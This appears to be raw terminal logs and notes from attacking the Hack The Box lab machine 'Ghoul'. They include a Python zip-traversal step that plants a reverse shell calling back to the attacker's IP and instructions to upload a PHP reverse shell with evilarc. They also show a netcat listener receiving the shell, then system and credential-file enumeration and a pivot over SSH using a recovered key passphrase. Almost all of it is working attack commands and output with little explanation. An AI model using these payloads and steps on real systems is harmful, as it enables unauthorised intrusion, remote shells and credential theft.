@@ -1,0 +1,761 @@
+root@kali:~/HTB/Ghoul# ssh ghoul.htb
+root@ghoul.htb: Permission denied (publickey).
+
+root@kali:~/HTB/Ghoul# ssh -p 2222 ghoul.htb
+root@ghoul.htb: Permission denied (publickey).
+
+Port 8080 uses Basic Auth
+admin:admin
+YWRtaW46YWRtaW4=
+
+
+
+Zip directory traversal
+
+root@kali:~/HTB/Ghoul# python3
+Python 3.7.2+ (default, Feb 27 2019, 15:41:59) 
+[GCC 8.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> import zipfile
+>>> z_info = zipfile.ZipInfo(r"../config/__init__.py")
+>>> z_file = zipfile.ZipFile("/root/HTB/Ghoul/goodie.zip", mode="w")
+>>> a = "import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.207',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
+>>> z_file.writestr(z_info, a)
+>>> z_file.close()
+
+root@kali:~/HTB/Ghoul# python3
+Python 3.7.2+ (default, Feb 27 2019, 15:41:59) 
+[GCC 8.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+Use evilarc to upload zip file containing secret.php reverse shell 
+to /var/www/html
+with 6 depths
+
+then goto http://10.10.10.101/seceret.php to activate shell
+
+
+rroot@kali:~/HTB/Ghoul# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.13.175] from ghoul.htb [10.10.10.101] 60574
+Linux Aogiri 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 11:10:21 up  2:17, 17 users,  load average: 0.07, 0.13, 0.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+kaneki   pts/1    10.10.12.255     10:05    8:45   0.29s  0.28s ssh kaneki_pub@172.20.0.150
+kaneki   pts/0    10.10.12.168     09:19   14:45   0.53s  0.51s ssh -L 3030:172.18.0.2:3000 kaneki_pub@172.20.0.150
+kaneki   pts/2    10.10.12.156     08:59    1:48m  0.11s  0.10s ssh -L 4040:172.18.0.2:3000 kaneki_pub@172.20.0.150
+kaneki   pts/4    10.10.12.156     09:19    1:46m  0.02s  0.02s -bash
+kaneki   pts/5    10.10.12.168     09:22    1:07m  0.01s  0.01s -bash
+kaneki   pts/6    10.10.15.140     10:01   49:01   0.06s  0.06s -bash
+root     pts/7    10.10.15.140     10:02   57:17   5:01   5:01  ./pspy64
+kaneki   pts/8    10.10.15.140     09:28   49:33   1.80s  1.80s ssh kaneki_pub@172.20.0.150
+kaneki   pts/9    10.10.13.99      09:30    1:37m  0.06s  0.04s ssh -v kaneki_pub@172.20.0.150
+kaneki   pts/10   10.10.15.140     09:37    4:41   0.66s  0.66s ssh kaneki_pub@172.20.0.150
+kaneki   pts/11   10.10.15.140     09:55   12:45   0.23s  0.22s ssh kaneki_pub@172.20.0.150
+kaneki   pts/12   10.10.12.43      11:10    0.00s  0.00s  0.00s -bash
+kaneki   pts/13   10.10.15.140     10:05    3:48   0.32s  0.30s ssh kaneki_pub@172.20.0.150
+root     pts/14   172.20.0.1       10:12    8:45   0.19s  0.19s -bash
+root     pts/15   172.20.0.150     10:10   14:45   0.13s  0.05s ssh root@172.20.0.1
+root     pts/16   10.10.15.140     10:13   46:26   0.02s  0.02s -bash
+root     pts/17   172.20.0.1       10:17   14:45   0.01s  0.01s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ pwd
+/
+$ uname -a
+Linux Aogiri 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+$ env
+SUPERVISOR_GROUP_NAME=apache
+HOSTNAME=Aogiri
+OLDPWD=/home
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+SUPERVISOR_ENABLED=1
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
+SUPERVISOR_PROCESS_NAME=apache
+PWD=/
+
+$ who
+kaneki   pts/1        May 20 10:05 (10.10.12.255)
+kaneki   pts/0        May 20 09:19 (10.10.12.168)
+kaneki   pts/2        May 20 08:59 (10.10.12.156)
+kaneki   pts/4        May 20 09:19 (10.10.12.156)
+kaneki   pts/5        May 20 09:22 (10.10.12.168)
+kaneki   pts/6        May 20 11:15 (10.10.12.43)
+root     pts/7        May 20 10:02 (10.10.15.140)
+kaneki   pts/8        May 20 09:28 (10.10.15.140)
+kaneki   pts/9        May 20 09:30 (10.10.13.99)
+kaneki   pts/10       May 20 09:37 (10.10.15.140)
+root     pts/11       May 20 11:16 (172.20.0.1)
+root     pts/15       May 20 10:10 (172.20.0.150)
+root     pts/17       May 20 10:17 (172.20.0.1)
+$ 
+$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+$ ifconfig -a
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255
+        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
+        RX packets 664885  bytes 125400696 (125.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 614609  bytes 291842943 (291.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 7699  bytes 12543994 (12.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7699  bytes 12543994 (12.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+
+$ cd /var/www/html
+$ ls -a
+.
+..
+archives
+blog.html
+contact.html
+css
+eto.jpg
+images
+index.html
+js
+kaneki-ken.jpg
+kaneki.html
+kaneki.jpg
+kaneki.php
+ken.jpg
+less
+noro.jpg
+secret.php
+tatara.jpg
+uploads
+users
+$ ls -la
+total 348
+drwxr-xr-x 1 root root   4096 Dec 13 13:45 .
+drwxr-xr-x 1 root root   4096 Jan 22 17:16 ..
+drwxr-xr-x 1 root root   4096 Dec 13 13:45 archives
+-r-xr-xr-x 1 root root  10723 Dec 13 13:45 blog.html
+-r-xr-xr-x 1 root root   8977 Dec 13 13:45 contact.html
+dr-xr-xr-x 1 root root   4096 Dec 13 13:45 css
+-r-xr-xr-x 1 root root  37906 Dec 13 13:45 eto.jpg
+dr-xr-xr-x 1 root root   4096 Dec 13 13:45 images
+-r-xr-xr-x 1 root root  11000 Dec 13 13:45 index.html
+dr-xr-xr-x 1 root root   4096 Dec 13 13:45 js
+-r-xr-xr-x 1 root root  13721 Dec 13 13:45 kaneki-ken.jpg
+-rw-r--r-- 1 root root    239 Dec 13 13:45 kaneki.html
+-r-xr-xr-x 1 root root 112642 Dec 13 13:45 kaneki.jpg
+-r-xr-xr-x 1 root root    134 Dec 13 13:45 kaneki.php
+-r-xr-xr-x 1 root root  13721 Dec 13 13:45 ken.jpg
+dr-xr-xr-x 1 root root   4096 Dec 13 13:45 less
+-r-xr-xr-x 1 root root  18457 Dec 13 13:45 noro.jpg
+-r-xr-xr-x 1 root root   5493 May 21 10:03 secret.php
+-r-xr-xr-x 1 root root  18159 Dec 13 13:45 tatara.jpg
+dr-xr-xr-x 1 root root   4096 Dec 13 13:45 uploads
+dr-xr-xr-x 1 root root   4096 Dec 13 13:45 users
+$ whoami
+www-data
+$ ps -ef
+UID         PID   PPID  C STIME TTY          TIME CMD
+root          1      0  0 08:41 ?        00:00:03 /usr/bin/python /usr/bin/supervisord
+root         12      1  0 08:42 ?        00:00:00 /bin/sh /opt/apache.sh
+root         13      1  0 08:42 ?        00:00:00 cron -f
+root         15      1  0 08:42 ?        00:00:00 /usr/sbin/sshd -D
+root         16      1  4 08:42 ?        00:03:29 /usr/bin/java -Djava.util.logging.config.file=/usr/share/tomcat7/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Dignore.endorsed.dirs= -classpath /usr/share/tomcat7/bin/bootstrap.jar:/usr/share/tomcat7/bin/tomcat-juli.jar -Dcatalina.base=/usr/share/tomcat7 -Dcatalina.home=/usr/share/tomcat7 -Djava.io.tmpdir=/usr/share/tomcat7/temp org.apache.catalina.startup.Bootstrap start
+root         17     12  0 08:42 ?        00:00:00 /bin/sh /usr/sbin/apache2ctl -DFOREGROUND
+root         23     17  0 08:42 ?        00:00:01 /usr/sbin/apache2 -DFOREGROUND
+root         73     16  0 08:46 ?        00:00:00 /bin/sh
+root         77     15  0 08:47 ?        00:00:00 sshd: root@pts/0
+root         79     77  0 08:47 pts/0    00:00:00 -bash
+root         94     79  0 08:47 pts/0    00:00:00 ssh -i /var/backups/backups/keys/1 -L 3030:172.18.0.2:3000 kaneki_pub@172.20.0.150
+root         95     15  0 08:47 ?        00:00:00 sshd: root@pts/1
+root         97     95  0 08:47 pts/1    00:00:00 -bash
+root        213     15  0 09:22 ?        00:00:00 sshd: Eto [priv]
+Eto         215    213  0 09:22 ?        00:00:00 sshd: Eto@pts/2
+Eto         216    215  0 09:22 pts/2    00:00:00 -bash
+www-data    419     23  0 09:43 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+root        448     15  0 09:43 ?        00:00:00 sshd: root@pts/3
+root        450    448  0 09:43 pts/3    00:00:00 -bash
+root        463    450  0 09:43 pts/3    00:00:00 su kaneki
+kaneki      464    463  0 09:43 pts/3    00:00:00 bash
+kaneki      494    464  0 09:45 pts/3    00:00:00 ssh kaneki_pub@172.20.0.150
+root        629     15  0 09:53 ?        00:00:00 sshd: kaneki [priv]
+kaneki      631    629  0 09:53 ?        00:00:00 sshd: kaneki@pts/4
+kaneki      632    631  0 09:53 pts/4    00:00:00 -bash
+www-data    943     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    947     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    965     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    974     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    976     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    985     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    987     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data    988     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data   1010     23  0 09:54 ?        00:00:00 /usr/sbin/apache2 -DFOREGROUND
+www-data   1172    985  0 10:03 ?        00:00:00 sh -c uname -a; w; id; /bin/sh -i
+www-data   1176   1172  0 10:03 ?        00:00:00 /bin/sh -i
+www-data   1185   1176  0 10:06 ?        00:00:00 ps -ef
+$ 
+
+$ ssh -v kaneki_pub@172.20.0.150
+OpenSSH_7.6p1 Ubuntu-4ubuntu0.1, OpenSSL 1.0.2n  7 Dec 2017
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: Applying options for *
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+debug1: Connecting to 172.20.0.150 [172.20.0.150] port 22.
+debug1: Connection established.
+debug1: SELinux support disabled
+Could not create directory '/var/www/.ssh'.
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_rsa type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_rsa-cert type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_dsa type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_dsa-cert type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_ecdsa type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_ecdsa-cert type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_ed25519 type -1
+debug1: key_load_public: No such file or directory
+debug1: identity file /var/www/.ssh/id_ed25519-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.1
+debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.1 pat OpenSSH* compat 0x04000000
+debug1: Authenticating to 172.20.0.150:22 as 'kaneki_pub'
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ecdsa-sha2-nistp256
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: Server host key: ecdsa-sha2-nistp256 SHA256:Z1h4Cthud4AEhgL2JSaahRr50yYch1wDIpFfrowTAZA
+Warning: Permanently added '172.20.0.150' (ECDSA) to the list of known hosts.
+debug1: rekey after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey after 134217728 blocks
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey
+debug1: Next authentication method: publickey
+debug1: Trying private key: /var/www/.ssh/id_rsa
+debug1: Trying private key: /var/www/.ssh/id_dsa
+debug1: Trying private key: /var/www/.ssh/id_ecdsa
+debug1: Trying private key: /var/www/.ssh/id_ed25519
+debug1: No more authentication methods to try.
+kaneki_pub@172.20.0.150: Permission denied (publickey).
+
+Use evilarc to upload zipped reverse shell as kaneki.php to /var/www/html with 6 depths
+then goto http://10.10.10.101/kaneki.php to activate shell
+
+
+$  cd /var/www/html
+$ cat secret.php
+<html>
+<head>
+<style>
+[class*="typicons-"]:before {
+  font-family: 'Typicons', sans-serif;
+}
+
+.module {
+  width: 1200px;
+  margin: 20px auto;
+}
+
+.top-bar {
+  background: #666;
+  color: white;
+  padding: 0.5rem;
+  position: relative;
+  overflow: hidden;
+}
+.top-bar h1 {
+  display: inline;
+  font-size: 1.1rem;
+}
+.top-bar .typicons-message {
+  display: inline-block;
+  padding: 4px 5px 2px 5px;
+}
+.top-bar .typicons-minus {
+  position: relative;
+  top: 3px;
+}
+.top-bar .left {
+  float: left;
+}
+.top-bar .right {
+  float: right;
+  padding-top: 5px;
+}
+.top-bar > * {
+  position: relative;
+}
+.top-bar::before {
+  content: "";
+  position: absolute;
+  top: -100%;
+  left: 0;
+  right: 0;
+  bottom: -100%;
+  opacity: 0.25;
+  background: radial-gradient(#ffffff, #000000);
+  animation: pulse 1s ease alternate infinite;
+}
+
+.discussion {
+  list-style: none;
+  background: #e5e5e5;
+  margin: 0;
+  padding: 0 0 50px 0;
+}
+.discussion li {
+  padding: 0.5rem;
+  overflow: hidden;
+  display: flex;
+}
+.discussion .avatar {
+  width: 40px;
+  position: relative;
+}
+.discussion .avatar img {
+  display: block;
+  width: 100%;
+}
+
+.other .avatar:after {
+  content: "";
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 0;
+  height: 0;
+  border: 5px solid white;
+  border-left-color: transparent;
+  border-bottom-color: transparent;
+}
+
+.self {
+  justify-content: flex-end;
+  align-items: flex-end;
+}
+.self .messages {
+  order: 1;
+  border-bottom-right-radius: 0;
+}
+.self .avatar {
+  order: 2;
+}
+.self .avatar:after {
+  content: "";
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  width: 0;
+  height: 0;
+  border: 5px solid white;
+  border-right-color: transparent;
+  border-top-color: transparent;
+  box-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+}
+
+.messages {
+  background: white;
+  padding: 10px;
+  border-radius: 2px;
+  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+}
+.messages p {
+  font-size: 0.8rem;
+  margin: 0 0 0.2rem 0;
+}
+.messages time {
+  font-size: 0.7rem;
+  color: #ccc;
+}
+
+@keyframes pulse {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 0.5;
+  }
+}
+</style>
+</head>
+<body>
+
+
+<section class="module">
+  
+  <header class="top-bar">
+    
+    <div class="left">
+      <span class="icon typicons-message"></span>
+      <h1>Aogiri Tree Secret Chat</h1>
+    </div>
+    
+    <div class="right">
+      <span class="icon typicons-minus"></span>
+      <span class="icon typicons-times"></span>
+    </div>
+    
+  </header>
+  
+  <ol class="discussion">
+    <li class="other">
+      <div class="avatar">
+        <img src="tatara.jpg" />
+      </div>
+      <div class="messages">
+        <p>Sup guys,I saw a couple getting all lovey-dovey in the park today,you know what I did? I ate them. Haha!</p>
+        <time datetime="2009-11-13T20:51">Tatara • 51 mins   </time>
+      </div>
+    </li>
+    <li class="self">
+      <div class="avatar">
+        <img src="noro.jpg" />
+      </div>
+      <div class="messages">
+        <p>Lmao,you lit.</p>
+        <p>But it's better if we stay low key for sometime.</p>
+        <time datetime="2009-11-13T20:37">Noro • 37 mins</time>
+      </div>
+    </li>
+    <li class="other">
+      <div class="avatar">
+	      <img src="ken.jpg" />
+      </div>
+      <div class="messages">
+        <p>Shut up,Tatara.</p>
+        <p>
+          Touka told me that there's RCE .What's the webdev doing?</p>
+	<p> Also please replace the file service with vsftp ASAP. It's not good to use it.
+        <time datetime="2009-11-13T20:20">Kaneki • 20 mins</time>
+     
+      </div>
+    </li>
+  </ol>
+  
+  <ol class="discussion">
+    <li class="other">
+      <div class="avatar">
+        <img src="eto.jpg" />
+      </div>
+      <div class="messages">
+        <p>Shit! I better get to work! </p>
+	<p>Also guys I found this file user.txt on desktop with contents..</p>
+	<p>ef7ad35c0f932f22d84158f6ced07a6d does anyone know what it is?</p>
+
+        <time datetime="2009-11-13T20:10">Eto • 10 mins</time>
+      </div>
+    </li>
+    <li class="self">
+      <div class="avatar">
+        <img src="noro.jpg" />
+      </div>
+      <div class="messages">
+        <p>Bleh! It's impossible to get into our servers.</p>
+	<p>And before CCG tries I'll check the IP logs and eat them.Hahaha! .</p><p>BTW Kaneki I needed the access for your remote server! </p>
+        <time datetime="2009-11-13T20:00">Noro •Just now</time>
+      </div>
+    </li>
+
+
+    <li class="other">
+      <div class="avatar">
+	      <img src="ken.jpg" />
+      </div>
+      <div class="messages">
+        <p>ILoveTouka <3</p>
+        <p>
+          Eto start the X server I wish to connect and update the wp too
+	  <br>Also,guys I've made a fake Art site so that our members can upload CCG pics secretly.Please inform everyone. </br></p>
+        <time datetime="2009-11-13T20:20">Kaneki • Just now</time>
+     
+      </div>
+    </li>
+  </ol>
+</section>
+Chat is unavailable at the moment!
+</body>
+</html>
+
+
+root@kali:~/HTB/Ghoul# cp kaneki.backup k.backup
+root@kali:~/HTB/Ghoul# chmod 600 k.backup
+root@kali:~/HTB/Ghoul# ssh -i k.backup kaneki@10.10.10.101
+Enter passphrase for key 'k.backup': 
+Enter passphrase for key 'k.backup': 
+
+root@kali:~/HTB/Ghoul# ssh -i k.backup kaneki@10.10.10.101
+Enter passphrase for key 'k.backup': ILoveTouka
+Last login: Thu May 23 16:52:57 2019 from 10.10.15.245
+kaneki@Aogiri:~$ locate user.txt
+
+Command 'locate' not found, but can be installed with:
+
+apt install mlocate
+apt install locate 
+
+Ask your administrator to install one of them.
+
+kaneki@Aogiri:~$ pwd
+/home/kaneki
+kaneki@Aogiri:~$ ls -a
+.   .bash_history  .bashrc   .ssh      LinEnum.sh  nmap      notes       user.txt
+..  .bash_logout   .profile  .viminfo  lse.sh      note.txt  secret.jpg
+kaneki@Aogiri:~$ cat user.txt
+7c0f11041f210f4f7d1711d40a1c35c2
+kaneki@Aogiri:~$ 
+
+kaneki@Aogiri:~$ cat note.txt
+Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
+kaneki@Aogiri:~$ 
+
+kaneki@Aogiri:~$ cat notes
+I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
+DM me for the access.
+kaneki@Aogiri:~$ 
+
+kaneki@Aogiri:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+kaneki:x:1000:1000::/home/kaneki:/bin/bash
+Eto:x:1001:1001::/home/Eto:/bin/bash
+noro:x:1002:1002::/home/noro:/bin/bash
+kaneki@Aogiri:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+kaneki@Aogiri:~$ 
+
+kaneki@Aogiri:~$ ls -a
+.              .bash_logout  .ssh        lse.sh    notes
+..             .bashrc       .viminfo    nmap      secret.jpg
+.bash_history  .profile      LinEnum.sh  note.txt  user.txt
+kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150
+Enter passphrase for key '/home/kaneki/.ssh/id_rsa': ILoveTouka
+Last login: Thu May 23 18:33:34 2019 from 172.20.0.10
+kaneki_pub@kaneki-pc:~$ 
+
+kaneki_pub@kaneki-pc:~$ ls -a
+.   .bash_history  .bashrc   .ssh      .wget-hsts
+..  .bash_logout   .profile  .viminfo  to-do.txt
+kaneki_pub@kaneki-pc:~$ cat to-do.txt
+Give AogiriTest user access to Eto for git.
+kaneki_pub@kaneki-pc:~$ pwd
+/home/kaneki_pub
+kaneki_pub@kaneki-pc:~$ 
+
+kaneki_pub@kaneki-pc:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+kaneki_pub@kaneki-pc:~$ cat .wget-hsts
+# HSTS 1.0 Known Hosts database for GNU Wget.
+# Edit at your own risk.
+# <hostname>	<port>	<incl. subdomains>	<created>	<max-age>
+github.com	0	1	1546183881	31536000
+kaneki_pub@kaneki-pc:~$ cat .bash_history
+kaneki_pub@kaneki-pc:~$ uname -a
+Linux kaneki-pc 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+kaneki_pub@kaneki-pc:~$ env
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+SSH_CONNECTION=172.20.0.10 45332 172.20.0.150 22
+LANG=C.UTF-8
+USER=kaneki_pub
+PWD=/home/kaneki_pub
+HOME=/home/kaneki_pub
+SSH_CLIENT=172.20.0.10 45332 22
+SSH_TTY=/dev/pts/2
+MAIL=/var/mail/kaneki_pub
+TERM=xterm-256color
+SHELL=/bin/bash
+SHLVL=1
+LOGNAME=kaneki_pub
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+_=/usr/bin/env
+kaneki_pub@kaneki-pc:~$ whoami
+kaneki_pub
+kaneki_pub@kaneki-pc:~$ 
+
+kaneki_pub@kaneki-pc:~$ ps aux
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.0  0.4  54460 19772 pts/0    Ss+  14:57   0:03 /usr/bin/python /usr/bin/supervisord -c /etc/supervisor/conf.d
+root          9  0.0  0.1  72296  6168 pts/0    S    14:57   0:00 /usr/sbin/sshd -D
+root        106  0.0  0.1  74660  6524 ?        Ss   16:42   0:00 sshd: kaneki_pub [priv]
+kaneki_+    108  0.0  0.0  74864  3972 ?        S    16:42   0:00 sshd: kaneki_pub
+root        181  0.0  0.1  74656  6524 ?        Ss   18:33   0:00 sshd: kaneki_pub [priv]
+kaneki_+    183  0.0  0.0  74656  3192 ?        S    18:33   0:00 sshd: kaneki_pub@pts/1
+kaneki_+    184  0.0  0.0  20384  3820 pts/1    Ss+  18:33   0:00 -bash
+root        191  0.0  0.1  74656  6416 ?        Ss   18:35   0:00 sshd: kaneki_pub [priv]
+kaneki_+    193  0.0  0.0  74656  3292 ?        R    18:35   0:00 sshd: kaneki_pub@pts/2
+kaneki_+    194  0.0  0.0  20256  3784 pts/2    Ss   18:35   0:00 -bash
+kaneki_+    234  0.0  0.0  36148  3272 pts/2    R+   18:44   0:00 ps aux
+kaneki_pub@kaneki-pc:~$ 
+kaneki_pub@kaneki-pc:~$ ps -ef
+UID         PID   PPID  C STIME TTY          TIME CMD
+root          1      0  0 14:57 pts/0    00:00:03 /usr/bin/pytho
+root          9      1  0 14:57 pts/0    00:00:00 /usr/sbin/sshd
+root        106      9  0 16:42 ?        00:00:00 sshd: kaneki_p
+kaneki_+    108    106  0 16:42 ?        00:00:00 sshd: kaneki_p
+root        181      9  0 18:33 ?        00:00:00 sshd: kaneki_p
+kaneki_+    183    181  0 18:33 ?        00:00:00 sshd: kaneki_p
+kaneki_+    184    183  0 18:33 pts/1    00:00:00 -bash
+root        191      9  0 18:35 ?        00:00:00 sshd: kaneki_p
+kaneki_+    193    191  0 18:35 ?        00:00:00 sshd: kaneki_p
+kaneki_+    194    193  0 18:35 pts/2    00:00:00 -bash
